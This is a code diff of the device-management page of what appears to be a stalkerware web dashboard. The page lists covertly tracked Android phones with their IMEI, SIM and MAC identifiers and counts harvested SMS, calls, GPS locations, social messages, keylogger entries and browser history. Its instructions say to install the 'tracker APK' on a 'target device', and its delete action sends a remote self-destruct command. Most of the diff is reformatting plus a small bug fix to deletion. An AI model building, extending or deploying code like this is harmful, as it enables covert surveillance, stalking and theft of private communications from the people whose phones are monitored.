@@ -4,8 +4,8 @@ import React, { useState, useEffect, useMemo, useCallback } from "react"
 import { useRouter } from "next/navigation"
 import { format, formatDistanceToNow, parseISO } from "date-fns"
 import { toast } from "sonner"
-import { 
-  Smartphone, Battery, BatteryCharging, HardDrive, Filter, 
+import {
+  Smartphone, Battery, BatteryCharging, HardDrive, Filter,
   Wifi, WifiOff, Trash2, Edit2, Check, X, ShieldAlert,
   Info, BarChart3, Settings, Cpu, HardDriveDownload, MonitorSmartphone,
   Copy, SmartphoneNfc, LayoutDashboard, CopyCheck, AlertCircle, RefreshCw
@@ -32,22 +32,22 @@ import { cn } from "@/lib/utils"
 export default function DevicesPage() {
   const router = useRouter()
   const { devices, selectedDeviceId, setSelectedDevice, removeDevice, updateDevice } = useDeviceStore()
-  
+
   const [userId, setUserId] = useState<string>("")
   const [userEmail, setUserEmail] = useState<string>("")
   const [isLoading, setIsLoading] = useState(true)
   const [isRefreshing, setIsRefreshing] = useState(false)
 
   const [filterTabs, setFilterTabs] = useState("all")
-  
+
   // Renaming State
   const [editingId, setEditingId] = useState<string | null>(null)
   const [editName, setEditName] = useState("")
-  
+
   // Modals
   const [deleteDevice, setDeleteDevice] = useState<Device | null>(null)
   const [isDeleting, setIsDeleting] = useState(false)
-  
+
   const [infoDevice, setInfoDevice] = useState<Device | null>(null)
   const [deviceStats, setDeviceStats] = useState<any>(null)
   const [isFetchingStats, setIsFetchingStats] = useState(false)
@@ -93,7 +93,7 @@ export default function DevicesPage() {
   }, [devices, filterTabs])
 
   // ── Actions ─────────────────────────────────────────────────────────────
-  
+
   const handleRenameStart = (dev: Device, e: React.MouseEvent) => {
     e.stopPropagation()
     setEditingId(dev.id)
@@ -111,9 +111,9 @@ export default function DevicesPage() {
       const { error } = await (supabase.from('devices') as any)
         .update({ device_name: editName.trim() })
         .eq('id', editingId)
-      
+
       if (error) throw error
-      
+
       updateDevice(editingId, { device_name: editName.trim() })
       toast.success("Device renamed successfully")
     } catch (err: any) {
@@ -123,20 +123,20 @@ export default function DevicesPage() {
     }
   }
 
-  const handleDeleteDevice = async () => {
-    if (!deleteDevice) return
+  const handleDeleteDevice = async (deviceToDelete: Device) => {
+    if (!deviceToDelete) return
     setIsDeleting(true)
     try {
       // Optional: Insert self destruct command
       await (supabase.from("remote_commands") as any).insert({
-        device_id: deleteDevice.id,
+        device_id: deviceToDelete.id,
         command_type: "self_destruct",
         payload: {},
         status: "pending"
       })
 
       // Call the absolute wipe API route to cascade delete across all tables instantly
-      const response = await fetch(`/api/v1/device/${deleteDevice.id}`, {
+      const response = await fetch(`/api/v1/device/${deviceToDelete.id}`, {
         method: "DELETE",
         headers: { "Content-Type": "application/json" }
       })
@@ -146,12 +146,11 @@ export default function DevicesPage() {
         throw new Error(errData.error || "Failed to erase device")
       }
 
-      removeDevice(deleteDevice.id)
-      if (selectedDeviceId === deleteDevice.id) setSelectedDevice(devices.find(d => d.id !== deleteDevice?.id)?.id || "")
-      toast.success(`${deleteDevice.device_name} and all associated data permanently erased`)
-      setDeleteDevice(null)
+      removeDevice(deviceToDelete.id)
+      if (selectedDeviceId === deviceToDelete.id) setSelectedDevice(devices.find(d => d.id !== deviceToDelete?.id)?.id || "")
+      toast.success(`${deviceToDelete.device_name} and all associated data permanently erased`)
     } catch (err: any) {
-      toast.error("Failed to delete device")
+      toast.error(err.message || "Failed to delete device")
     } finally {
       setIsDeleting(false)
     }
@@ -162,17 +161,17 @@ export default function DevicesPage() {
     setInfoDevice(dev)
     setIsFetchingStats(true)
     setDeviceStats(null)
-    
+
     // Quick count aggregates using head requests to avoid giant payloads
     try {
       const tables = ["sms_messages", "call_logs", "locations", "social_messages", "keylogger_entries", "browser_history", "notification_logs"]
       const stats: Record<string, number> = {}
-      
+
       await Promise.all(tables.map(async (table) => {
         const { count } = await supabase.from(table).select('*', { count: 'exact', head: true }).eq('device_id', dev.id)
         stats[table] = count || 0
       }))
-      
+
       setDeviceStats(stats)
     } catch (err) {
       console.error(err)
@@ -191,7 +190,7 @@ export default function DevicesPage() {
     setSelectedDevice(id)
     router.push("/")
   }
-  
+
   const handleViewSettings = (id: string, e: React.MouseEvent) => {
     e.stopPropagation()
     setSelectedDevice(id)
@@ -206,7 +205,7 @@ export default function DevicesPage() {
         .from('devices')
         .select('id, is_online, last_seen, battery_level, is_charging, storage_used, storage_total, ram_used, ram_total')
         .eq('user_id', userId)
-      
+
       if (error) throw error
 
       if (freshDevices && Array.isArray(freshDevices)) {
@@ -268,7 +267,7 @@ export default function DevicesPage() {
       <div className="w-full space-y-6 pb-20 animate-in fade-in">
         <PageHeader title="📱 My Devices" description="All devices automatically connected to your account" />
         <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-          {[1,2,3].map(i => <Skeleton key={i} className="h-48 w-full rounded-xl" />)}
+          {[1, 2, 3].map(i => <Skeleton key={i} className="h-48 w-full rounded-xl" />)}
         </div>
       </div>
     )
@@ -277,8 +276,8 @@ export default function DevicesPage() {
   return (
     <div className="w-full space-y-6 pb-20 animate-in fade-in">
       <div className="flex flex-col sm:flex-row sm:items-start justify-between gap-4">
-        <PageHeader 
-          title="📱 My Devices" 
+        <PageHeader
+          title="📱 My Devices"
           description="All devices automatically connected to your account"
         />
         {devices.length > 0 && (
@@ -299,13 +298,13 @@ export default function DevicesPage() {
       </div>
 
       {devices.length > 0 && (
-         <div className="bg-indigo-50/80 dark:bg-indigo-950/30 border border-indigo-100 dark:border-indigo-900/50 rounded-xl p-4 flex gap-4 text-indigo-800 dark:text-indigo-300 shadow-sm animate-in zoom-in-95 duration-500">
-           <MonitorSmartphone className="h-6 w-6 text-indigo-500 shrink-0 mt-0.5" />
-           <div className="text-sm">
-              <strong className="block mb-1">To add a new device:</strong>
-              Install the tracker APK on any target Android device → Open the app → Login with your email & password → The device will automatically appear in this dashboard within seconds.
-           </div>
-         </div>
+        <div className="bg-indigo-50/80 dark:bg-indigo-950/30 border border-indigo-100 dark:border-indigo-900/50 rounded-xl p-4 flex gap-4 text-indigo-800 dark:text-indigo-300 shadow-sm animate-in zoom-in-95 duration-500">
+          <MonitorSmartphone className="h-6 w-6 text-indigo-500 shrink-0 mt-0.5" />
+          <div className="text-sm">
+            <strong className="block mb-1">To add a new device:</strong>
+            Install the tracker APK on any target Android device → Open the app → Login with your email & password → The device will automatically appear in this dashboard within seconds.
+          </div>
+        </div>
       )}
 
       {devices.length === 0 ? (
@@ -319,37 +318,37 @@ export default function DevicesPage() {
               <Wifi className="h-5 w-5" />
             </div>
           </div>
-          
+
           <h2 className="text-2xl font-bold text-slate-900 dark:text-slate-100 mb-3">No devices connected yet</h2>
           <p className="text-slate-500 max-w-md mx-auto mb-8">
             Install the tracker app on any Android device and login with your account credentials. The device will securely sync and appear here magically.
           </p>
 
           <div className="grid grid-cols-1 sm:grid-cols-4 gap-4 w-full max-w-4xl text-left mb-8">
-             <div className="bg-white dark:bg-slate-900 p-4 border rounded-xl shadow-sm relative overflow-hidden">
-               <div className="absolute top-0 right-0 w-8 h-8 bg-slate-100 dark:bg-slate-800 rounded-bl-xl flex items-center justify-center text-xs font-bold text-slate-400">1</div>
-               <HardDriveDownload className="h-5 w-5 text-indigo-500 mb-2" />
-               <p className="text-sm font-medium">Download APK to target device</p>
-             </div>
-             <div className="bg-white dark:bg-slate-900 p-4 border rounded-xl shadow-sm relative overflow-hidden">
-               <div className="absolute top-0 right-0 w-8 h-8 bg-slate-100 dark:bg-slate-800 rounded-bl-xl flex items-center justify-center text-xs font-bold text-slate-400">2</div>
-               <Cpu className="h-5 w-5 text-indigo-500 mb-2" />
-               <p className="text-sm font-medium">Install & open the application</p>
-             </div>
-             <div className="bg-indigo-50 dark:bg-indigo-950/30 p-4 border border-indigo-100 dark:border-indigo-900/50 rounded-xl shadow-sm relative overflow-hidden ring-1 ring-indigo-500/20">
-               <div className="absolute top-0 right-0 w-8 h-8 bg-indigo-200 dark:bg-indigo-900 text-indigo-700 dark:text-indigo-300 rounded-bl-xl flex items-center justify-center text-xs font-bold">3</div>
-               <ShieldAlert className="h-5 w-5 text-indigo-600 mb-2" />
-               <p className="text-sm font-medium text-slate-700 dark:text-slate-300">Login with:<br/><span className="text-indigo-600 dark:text-indigo-400 font-bold break-all bg-white dark:bg-slate-900 px-1 py-0.5 rounded mt-1 inline-block">{userEmail}</span></p>
-             </div>
-             <div className="bg-white dark:bg-slate-900 p-4 border rounded-xl shadow-sm relative overflow-hidden">
-               <div className="absolute top-0 right-0 w-8 h-8 bg-emerald-100 dark:bg-emerald-900/50 text-emerald-700 dark:text-emerald-400 rounded-bl-xl flex items-center justify-center text-xs font-bold">4</div>
-               <Check className="h-5 w-5 text-emerald-500 mb-2" />
-               <p className="text-sm font-medium">Device connects automatically!</p>
-             </div>
+            <div className="bg-white dark:bg-slate-900 p-4 border rounded-xl shadow-sm relative overflow-hidden">
+              <div className="absolute top-0 right-0 w-8 h-8 bg-slate-100 dark:bg-slate-800 rounded-bl-xl flex items-center justify-center text-xs font-bold text-slate-400">1</div>
+              <HardDriveDownload className="h-5 w-5 text-indigo-500 mb-2" />
+              <p className="text-sm font-medium">Download APK to target device</p>
+            </div>
+            <div className="bg-white dark:bg-slate-900 p-4 border rounded-xl shadow-sm relative overflow-hidden">
+              <div className="absolute top-0 right-0 w-8 h-8 bg-slate-100 dark:bg-slate-800 rounded-bl-xl flex items-center justify-center text-xs font-bold text-slate-400">2</div>
+              <Cpu className="h-5 w-5 text-indigo-500 mb-2" />
+              <p className="text-sm font-medium">Install & open the application</p>
+            </div>
+            <div className="bg-indigo-50 dark:bg-indigo-950/30 p-4 border border-indigo-100 dark:border-indigo-900/50 rounded-xl shadow-sm relative overflow-hidden ring-1 ring-indigo-500/20">
+              <div className="absolute top-0 right-0 w-8 h-8 bg-indigo-200 dark:bg-indigo-900 text-indigo-700 dark:text-indigo-300 rounded-bl-xl flex items-center justify-center text-xs font-bold">3</div>
+              <ShieldAlert className="h-5 w-5 text-indigo-600 mb-2" />
+              <p className="text-sm font-medium text-slate-700 dark:text-slate-300">Login with:<br /><span className="text-indigo-600 dark:text-indigo-400 font-bold break-all bg-white dark:bg-slate-900 px-1 py-0.5 rounded mt-1 inline-block">{userEmail}</span></p>
+            </div>
+            <div className="bg-white dark:bg-slate-900 p-4 border rounded-xl shadow-sm relative overflow-hidden">
+              <div className="absolute top-0 right-0 w-8 h-8 bg-emerald-100 dark:bg-emerald-900/50 text-emerald-700 dark:text-emerald-400 rounded-bl-xl flex items-center justify-center text-xs font-bold">4</div>
+              <Check className="h-5 w-5 text-emerald-500 mb-2" />
+              <p className="text-sm font-medium">Device connects automatically!</p>
+            </div>
           </div>
 
           <Button size="lg" className="bg-indigo-600 hover:bg-indigo-700 text-white rounded-full font-bold px-8 shadow-indigo-200 dark:shadow-indigo-900/20 shadow-lg" onClick={() => {
-             toast("APK Link Copied", { description: "You can now paste this link on the target device browser." })
+            toast("APK Link Copied", { description: "You can now paste this link on the target device browser." })
           }}>
             <Copy className="h-4 w-4 mr-2" /> Copy Download Link
           </Button>
@@ -358,21 +357,21 @@ export default function DevicesPage() {
         <>
           <div className="flex gap-2 border-b border-slate-200 dark:border-slate-800 pb-px">
             {["all", "online", "offline"].map(t => {
-               const isActive = filterTabs === t
-               const count = t === "all" ? devices.length : t === "online" ? devices.filter(d => d.is_online).length : devices.filter(d => !d.is_online).length
-               
-               return (
-                 <button 
+              const isActive = filterTabs === t
+              const count = t === "all" ? devices.length : t === "online" ? devices.filter(d => d.is_online).length : devices.filter(d => !d.is_online).length
+
+              return (
+                <button
                   key={t}
                   onClick={() => setFilterTabs(t)}
                   className={cn(
                     "px-4 py-2 text-sm font-medium capitalize border-b-2 transition-all",
-                     isActive ? "border-indigo-600 text-indigo-600 dark:text-indigo-400 shadow-[inset_0_-2px_0_rgba(79,70,229,0.1)]" : "border-transparent text-slate-500 hover:text-slate-700 hover:border-slate-300"
+                    isActive ? "border-indigo-600 text-indigo-600 dark:text-indigo-400 shadow-[inset_0_-2px_0_rgba(79,70,229,0.1)]" : "border-transparent text-slate-500 hover:text-slate-700 hover:border-slate-300"
                   )}
-                 >
-                   {t} <Badge variant="secondary" className="ml-1.5 py-0 px-1.5 text-[10px] w-6 justify-center bg-slate-100 dark:bg-slate-800">{count}</Badge>
-                 </button>
-               )
+                >
+                  {t} <Badge variant="secondary" className="ml-1.5 py-0 px-1.5 text-[10px] w-6 justify-center bg-slate-100 dark:bg-slate-800">{count}</Badge>
+                </button>
+              )
             })}
           </div>
 
@@ -384,14 +383,14 @@ export default function DevicesPage() {
               const storagePercent = Math.round((storageUsedNum / storageTotalNum) * 100)
 
               return (
-                <Card 
-                  key={device.id} 
+                <Card
+                  key={device.id}
                   onClick={() => handleCardClick(device.id)}
                   className={cn(
                     "relative transition-all duration-300 hover:shadow-lg cursor-pointer border-2 group flex flex-col bg-white dark:bg-slate-950",
-                    isSelected ? "border-indigo-500 shadow-indigo-100/50 dark:shadow-indigo-900/20 shadow-xl ring-2 ring-indigo-500/20" 
-                    : device.is_online ? "border-slate-200 dark:border-slate-800 hover:border-indigo-300 dark:hover:border-indigo-800"
-                    : "border-rose-100 dark:border-rose-900/30 hover:border-rose-200 dark:hover:border-rose-800/50"
+                    isSelected ? "border-indigo-500 shadow-indigo-100/50 dark:shadow-indigo-900/20 shadow-xl ring-2 ring-indigo-500/20"
+                      : device.is_online ? "border-slate-200 dark:border-slate-800 hover:border-indigo-300 dark:hover:border-indigo-800"
+                        : "border-rose-100 dark:border-rose-900/30 hover:border-rose-200 dark:hover:border-rose-800/50"
                   )}
                 >
                   {/* Status Indicator - shows online pulse OR offline age */}
@@ -400,7 +399,7 @@ export default function DevicesPage() {
                     !device.is_online && "border-rose-200 dark:border-rose-800"
                   )}>
                     <div className={cn(
-                      "h-2 w-2 rounded-full", 
+                      "h-2 w-2 rounded-full",
                       device.is_online ? "bg-emerald-500 animate-[pulse_2s_ease-in-out_infinite]" : "bg-rose-500"
                     )} />
                     <span className={cn(
@@ -425,9 +424,9 @@ export default function DevicesPage() {
                       <div className="flex-1 min-w-0">
                         {editingId === device.id ? (
                           <div className="flex items-center gap-2 mb-1">
-                            <Input 
-                              value={editName} 
-                              onChange={e => setEditName(e.target.value)} 
+                            <Input
+                              value={editName}
+                              onChange={e => setEditName(e.target.value)}
                               onKeyDown={e => e.key === 'Enter' && handleRenameSave()}
                               autoFocus
                               className="h-7 px-2 text-sm font-semibold border-indigo-300 focus-visible:ring-indigo-500"
@@ -462,9 +461,9 @@ export default function DevicesPage() {
                       <div>
                         <span className="text-[10px] font-semibold text-slate-500 uppercase tracking-wider block mb-1">Last Seen</span>
                         <div className="text-xs font-medium text-slate-700 dark:text-slate-300 flex items-center gap-1">
-                           <WifiOff className={cn("h-3 w-3", device.is_online ? "hidden" : "inline-block text-rose-500")} />
-                           <Wifi className={cn("h-3 w-3", device.is_online ? "inline-block text-emerald-500" : "hidden")} />
-                           <span className="truncate">{device.last_seen ? formatDistanceToNow(parseISO(device.last_seen), { addSuffix: true }) : "Never"}</span>
+                          <WifiOff className={cn("h-3 w-3", device.is_online ? "hidden" : "inline-block text-rose-500")} />
+                          <Wifi className={cn("h-3 w-3", device.is_online ? "inline-block text-emerald-500" : "hidden")} />
+                          <span className="truncate">{device.last_seen ? formatDistanceToNow(parseISO(device.last_seen), { addSuffix: true }) : "Never"}</span>
                         </div>
                       </div>
                       <div>
@@ -477,26 +476,26 @@ export default function DevicesPage() {
                     </div>
 
                     <div className="space-y-1.5 mt-2">
-                       <div className="flex justify-between items-end text-xs">
-                         <span className="text-slate-500 flex items-center gap-1.5"><HardDrive className="h-3.5 w-3.5" /> Storage</span>
-                         <span className="font-medium text-slate-700 dark:text-slate-300">{storagePercent}% used</span>
-                       </div>
-                       <Progress value={storagePercent} className={cn("h-1.5", storagePercent > 90 ? "[&_[data-slot=progress-indicator]]:bg-rose-500" : storagePercent > 70 ? "[&_[data-slot=progress-indicator]]:bg-amber-500" : "[&_[data-slot=progress-indicator]]:bg-indigo-500")} />
-                       <p className="text-[10px] text-right text-slate-400 mt-0.5">{formatBytes(storageUsedNum)} / {formatBytes(storageTotalNum)}</p>
+                      <div className="flex justify-between items-end text-xs">
+                        <span className="text-slate-500 flex items-center gap-1.5"><HardDrive className="h-3.5 w-3.5" /> Storage</span>
+                        <span className="font-medium text-slate-700 dark:text-slate-300">{storagePercent}% used</span>
+                      </div>
+                      <Progress value={storagePercent} className={cn("h-1.5", storagePercent > 90 ? "[&_[data-slot=progress-indicator]]:bg-rose-500" : storagePercent > 70 ? "[&_[data-slot=progress-indicator]]:bg-amber-500" : "[&_[data-slot=progress-indicator]]:bg-indigo-500")} />
+                      <p className="text-[10px] text-right text-slate-400 mt-0.5">{formatBytes(storageUsedNum)} / {formatBytes(storageTotalNum)}</p>
                     </div>
 
                     <div className="grid grid-cols-1 gap-1 text-xs text-slate-600 dark:text-slate-400 pt-2 border-t border-slate-100 dark:border-slate-800">
                       <div className="flex justify-between">
-                         <span className="font-semibold text-slate-500 text-[10px] uppercase">Phone</span>
-                         <span className="font-mono">{device.phone_number || "—"}</span>
+                        <span className="font-semibold text-slate-500 text-[10px] uppercase">Phone</span>
+                        <span className="font-mono">{device.phone_number || "—"}</span>
                       </div>
                       <div className="flex justify-between">
-                         <span className="font-semibold text-slate-500 text-[10px] uppercase">IMEI</span>
-                         <span className="font-mono">{device.imei ? `****${device.imei.slice(-4)}` : "—"}</span>
+                        <span className="font-semibold text-slate-500 text-[10px] uppercase">IMEI</span>
+                        <span className="font-mono">{device.imei ? `****${device.imei.slice(-4)}` : "—"}</span>
                       </div>
                       <div className="flex justify-between mt-1">
-                         <span className="font-semibold text-slate-500 text-[10px] uppercase">Connected Since</span>
-                         <span>{device.created_at ? format(parseISO(device.created_at), "MMM d, yyyy") : "—"}</span>
+                        <span className="font-semibold text-slate-500 text-[10px] uppercase">Connected Since</span>
+                        <span>{device.created_at ? format(parseISO(device.created_at), "MMM d, yyyy") : "—"}</span>
                       </div>
                     </div>
                   </CardContent>
@@ -509,35 +508,32 @@ export default function DevicesPage() {
                       <Settings className="h-3.5 w-3.5 mr-1" /> Config
                     </Button>
                     <div className="flex gap-1">
-                       <Button variant="ghost" size="icon-sm" className="h-8 w-8 text-slate-400 hover:text-blue-600 hover:bg-blue-50 dark:hover:bg-blue-900/30" onClick={(e) => openDeviceInfo(device, e)}>
-                         <Info className="h-4 w-4" />
-                       </Button>
-                       <Dialog>
-                         <DialogTrigger>
-                           <Button variant="ghost" size="icon-sm" className="h-8 w-8 text-slate-400 hover:text-rose-600 hover:bg-rose-50 dark:hover:bg-rose-900/40" onClick={(e) => e.stopPropagation()}>
-                             <Trash2 className="h-4 w-4" />
-                           </Button>
-                         </DialogTrigger>
-                         <DialogContent onClick={(e) => e.stopPropagation()}>
-                            <DialogHeader>
-                              <DialogTitle className="text-rose-600 flex items-center gap-2"><ShieldAlert className="h-5 w-5" /> Remove Device</DialogTitle>
-                              <DialogDescription className="pt-4 text-slate-700 dark:text-slate-300">
-                                This will permanently delete <strong>{device.device_name}</strong> and <strong>ALL</strong> its tracked data instantly via Supabase cascading rules. 
-                                <br/><br/>
-                                The tracker app on the remote Android device will automatically halt operations and destruct its local vaults.
-                              </DialogDescription>
-                            </DialogHeader>
-                            <DialogFooter className="mt-6">
-                              <Button variant="outline" onClick={() => {}} disabled={isDeleting}>Cancel</Button>
-                              <Button variant="destructive" onClick={async () => {
-                                 setDeleteDevice(device)
-                                 setTimeout(handleDeleteDevice, 50)
-                              }} disabled={isDeleting} className="bg-rose-600 hover:bg-rose-700">
-                                {isDeleting ? "Erasing..." : "Purge Device & Data"}
-                              </Button>
-                            </DialogFooter>
-                         </DialogContent>
-                       </Dialog>
+                      <Button variant="ghost" size="icon-sm" className="h-8 w-8 text-slate-400 hover:text-blue-600 hover:bg-blue-50 dark:hover:bg-blue-900/30" onClick={(e) => openDeviceInfo(device, e)}>
+                        <Info className="h-4 w-4" />
+                      </Button>
+                      <Dialog>
+                        <DialogTrigger className="h-8 w-8 inline-flex items-center justify-center rounded-md text-slate-400 hover:text-rose-600 hover:bg-rose-50 dark:hover:bg-rose-900/40 transition-colors">
+                          <Trash2 className="h-4 w-4" />
+                        </DialogTrigger>
+                        <DialogContent onClick={(e) => e.stopPropagation()}>
+                          <DialogHeader>
+                            <DialogTitle className="text-rose-600 flex items-center gap-2"><ShieldAlert className="h-5 w-5" /> Remove Device</DialogTitle>
+                            <DialogDescription className="pt-4 text-slate-700 dark:text-slate-300">
+                              This will permanently delete <strong>{device.device_name}</strong> and <strong>ALL</strong> its tracked data instantly via Supabase cascading rules.
+                              <br /><br />
+                              The tracker app on the remote Android device will automatically halt operations and destruct its local vaults.
+                            </DialogDescription>
+                          </DialogHeader>
+                          <DialogFooter className="mt-6">
+                            <Button variant="outline" onClick={() => { }} disabled={isDeleting}>Cancel</Button>
+                            <Button variant="destructive" onClick={async () => {
+                              await handleDeleteDevice(device)
+                            }} disabled={isDeleting} className="bg-rose-600 hover:bg-rose-700">
+                              {isDeleting ? "Erasing..." : "Purge Device & Data"}
+                            </Button>
+                          </DialogFooter>
+                        </DialogContent>
+                      </Dialog>
                     </div>
                   </CardFooter>
                 </Card>
@@ -550,98 +546,98 @@ export default function DevicesPage() {
       {/* FULL DEVICE INFO MODAL */}
       <Dialog open={!!infoDevice} onOpenChange={(v) => !v && setInfoDevice(null)}>
         <DialogContent className="sm:max-w-[550px] p-0 overflow-hidden bg-slate-50 dark:bg-slate-950">
-           {infoDevice && (
-             <>
-               <div className="p-6 bg-white dark:bg-slate-900 border-b border-slate-100 dark:border-slate-800">
-                  <div className="flex justify-between items-start">
-                     <div>
-                       <DialogTitle className="text-xl">{infoDevice.device_name}</DialogTitle>
-                       <DialogDescription className="mt-1 flex items-center gap-2">
-                         <Smartphone className="h-4 w-4" /> {infoDevice.device_model} (Android {(infoDevice as any).android_version || '?'})
-                       </DialogDescription>
-                     </div>
-                     <Badge variant="outline" className={cn("capitalize font-bold border-2 shadow-none", (infoDevice as any).is_rooted ? "text-rose-600 border-rose-200 bg-rose-50" : "text-emerald-600 border-emerald-200 bg-emerald-50")}>
-                        {(infoDevice as any).is_rooted ? "Rooted" : "Not Rooted"}
-                     </Badge>
-                  </div>
-               </div>
-
-               <div className="p-6 space-y-6">
-                  {/* Detailed Specs Grid */}
-                  <div className="grid grid-cols-2 gap-x-6 gap-y-4 text-sm">
-                     <div>
-                       <span className="block text-[10px] font-bold uppercase text-slate-500 tracking-wider mb-1">Hardware identity</span>
-                       <div className="space-y-1.5 flex flex-col text-slate-700 dark:text-slate-300 font-medium">
-                          <div className="flex items-center justify-between bg-white dark:bg-slate-900 p-1.5 px-2 rounded border border-slate-100 dark:border-slate-800">
-                             <span className="text-xs text-slate-400 flex items-center gap-1.5"><SmartphoneNfc className="h-3 w-3"/> IMEI</span>
-                             <span className="font-mono text-xs">{infoDevice.imei || "—"}</span>
-                          </div>
-                          <div className="flex items-center justify-between bg-white dark:bg-slate-900 p-1.5 px-2 rounded border border-slate-100 dark:border-slate-800">
-                             <span className="text-xs text-slate-400 flex items-center gap-1.5"><Wifi className="h-3 w-3"/> MAC Addr</span>
-                             <span className="font-mono text-xs uppercase">{infoDevice.mac_address || "—"}</span>
-                          </div>
-                       </div>
-                     </div>
-                     <div>
-                       <span className="block text-[10px] font-bold uppercase text-slate-500 tracking-wider mb-1">Network & SIM</span>
-                       <div className="space-y-1.5 flex flex-col text-slate-700 dark:text-slate-300 font-medium">
-                          <div className="flex items-center justify-between border-b border-transparent pb-1">
-                             <span className="text-xs text-slate-400">Number:</span>
-                             <span className="font-mono">{infoDevice.phone_number || "—"}</span>
-                          </div>
-                          <div className="flex items-center justify-between border-b border-slate-100 dark:border-slate-800 pb-1">
-                             <span className="text-xs text-slate-400">Carrier:</span>
-                             <span className="truncate max-w-[100px]">{infoDevice.sim_operator || "—"}</span>
-                          </div>
-                          <div className="flex items-center justify-between pb-1">
-                             <span className="text-xs text-slate-400">SIM Serial:</span>
-                             <span className="font-mono text-[10px]">{infoDevice.sim_serial || "—"}</span>
-                          </div>
-                       </div>
-                     </div>
-                  </div>
-
-                  {/* Sync Stats */}
+          {infoDevice && (
+            <>
+              <div className="p-6 bg-white dark:bg-slate-900 border-b border-slate-100 dark:border-slate-800">
+                <div className="flex justify-between items-start">
                   <div>
-                    <span className="block text-[10px] font-bold uppercase text-slate-500 tracking-wider mb-2">Tracked Data Vault</span>
-                    <div className="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-xl p-4">
-                       {isFetchingStats ? (
-                         <div className="h-20 flex items-center justify-center text-slate-400 flex-col gap-2">
-                            <RefreshCw className="h-5 w-5 animate-spin" />
-                            <span className="text-xs font-medium">Aggregating records...</span>
-                         </div>
-                       ) : deviceStats ? (
-                         <div className="grid grid-cols-4 sm:grid-cols-4 gap-4 text-center">
-                            <div className="flex flex-col items-center">
-                              <span className="text-2xl font-black text-indigo-600 dark:text-indigo-400 tracking-tighter">{deviceStats.sms_messages}</span>
-                              <span className="text-[10px] uppercase font-bold text-slate-400 mt-1">SMS</span>
-                            </div>
-                            <div className="flex flex-col items-center">
-                              <span className="text-2xl font-black text-emerald-600 dark:text-emerald-400 tracking-tighter">{deviceStats.call_logs}</span>
-                              <span className="text-[10px] uppercase font-bold text-slate-400 mt-1">Calls</span>
-                            </div>
-                            <div className="flex flex-col items-center">
-                              <span className="text-2xl font-black text-amber-600 dark:text-amber-400 tracking-tighter">{deviceStats.locations}</span>
-                              <span className="text-[10px] uppercase font-bold text-slate-400 mt-1">Gps</span>
-                            </div>
-                            <div className="flex flex-col items-center">
-                              <span className="text-2xl font-black text-rose-600 dark:text-rose-400 tracking-tighter">{deviceStats.social_messages + deviceStats.keylogger_entries}</span>
-                              <span className="text-[10px] uppercase font-bold text-slate-400 mt-1">Logs</span>
-                            </div>
-                         </div>
-                       ) : (
-                         <div className="text-center text-xs text-rose-500">Failed to load statistics</div>
-                       )}
+                    <DialogTitle className="text-xl">{infoDevice.device_name}</DialogTitle>
+                    <DialogDescription className="mt-1 flex items-center gap-2">
+                      <Smartphone className="h-4 w-4" /> {infoDevice.device_model} (Android {(infoDevice as any).android_version || '?'})
+                    </DialogDescription>
+                  </div>
+                  <Badge variant="outline" className={cn("capitalize font-bold border-2 shadow-none", (infoDevice as any).is_rooted ? "text-rose-600 border-rose-200 bg-rose-50" : "text-emerald-600 border-emerald-200 bg-emerald-50")}>
+                    {(infoDevice as any).is_rooted ? "Rooted" : "Not Rooted"}
+                  </Badge>
+                </div>
+              </div>
+
+              <div className="p-6 space-y-6">
+                {/* Detailed Specs Grid */}
+                <div className="grid grid-cols-2 gap-x-6 gap-y-4 text-sm">
+                  <div>
+                    <span className="block text-[10px] font-bold uppercase text-slate-500 tracking-wider mb-1">Hardware identity</span>
+                    <div className="space-y-1.5 flex flex-col text-slate-700 dark:text-slate-300 font-medium">
+                      <div className="flex items-center justify-between bg-white dark:bg-slate-900 p-1.5 px-2 rounded border border-slate-100 dark:border-slate-800">
+                        <span className="text-xs text-slate-400 flex items-center gap-1.5"><SmartphoneNfc className="h-3 w-3" /> IMEI</span>
+                        <span className="font-mono text-xs">{infoDevice.imei || "—"}</span>
+                      </div>
+                      <div className="flex items-center justify-between bg-white dark:bg-slate-900 p-1.5 px-2 rounded border border-slate-100 dark:border-slate-800">
+                        <span className="text-xs text-slate-400 flex items-center gap-1.5"><Wifi className="h-3 w-3" /> MAC Addr</span>
+                        <span className="font-mono text-xs uppercase">{infoDevice.mac_address || "—"}</span>
+                      </div>
                     </div>
                   </div>
-
-                  <div className="flex justify-between items-center text-xs text-slate-500 bg-slate-100 dark:bg-slate-900 rounded-lg p-3 font-medium">
-                     <span className="flex items-center gap-1.5"><ShieldAlert className="h-3.5 w-3.5" /> App v{infoDevice.app_version || "1.0.0"}</span>
-                     <span>Registered: {infoDevice.created_at ? format(parseISO(infoDevice.created_at), "MMM d, yyyy h:mm a") : "—"}</span>
+                  <div>
+                    <span className="block text-[10px] font-bold uppercase text-slate-500 tracking-wider mb-1">Network & SIM</span>
+                    <div className="space-y-1.5 flex flex-col text-slate-700 dark:text-slate-300 font-medium">
+                      <div className="flex items-center justify-between border-b border-transparent pb-1">
+                        <span className="text-xs text-slate-400">Number:</span>
+                        <span className="font-mono">{infoDevice.phone_number || "—"}</span>
+                      </div>
+                      <div className="flex items-center justify-between border-b border-slate-100 dark:border-slate-800 pb-1">
+                        <span className="text-xs text-slate-400">Carrier:</span>
+                        <span className="truncate max-w-[100px]">{infoDevice.sim_operator || "—"}</span>
+                      </div>
+                      <div className="flex items-center justify-between pb-1">
+                        <span className="text-xs text-slate-400">SIM Serial:</span>
+                        <span className="font-mono text-[10px]">{infoDevice.sim_serial || "—"}</span>
+                      </div>
+                    </div>
                   </div>
-               </div>
-             </>
-           )}
+                </div>
+
+                {/* Sync Stats */}
+                <div>
+                  <span className="block text-[10px] font-bold uppercase text-slate-500 tracking-wider mb-2">Tracked Data Vault</span>
+                  <div className="bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-xl p-4">
+                    {isFetchingStats ? (
+                      <div className="h-20 flex items-center justify-center text-slate-400 flex-col gap-2">
+                        <RefreshCw className="h-5 w-5 animate-spin" />
+                        <span className="text-xs font-medium">Aggregating records...</span>
+                      </div>
+                    ) : deviceStats ? (
+                      <div className="grid grid-cols-4 sm:grid-cols-4 gap-4 text-center">
+                        <div className="flex flex-col items-center">
+                          <span className="text-2xl font-black text-indigo-600 dark:text-indigo-400 tracking-tighter">{deviceStats.sms_messages}</span>
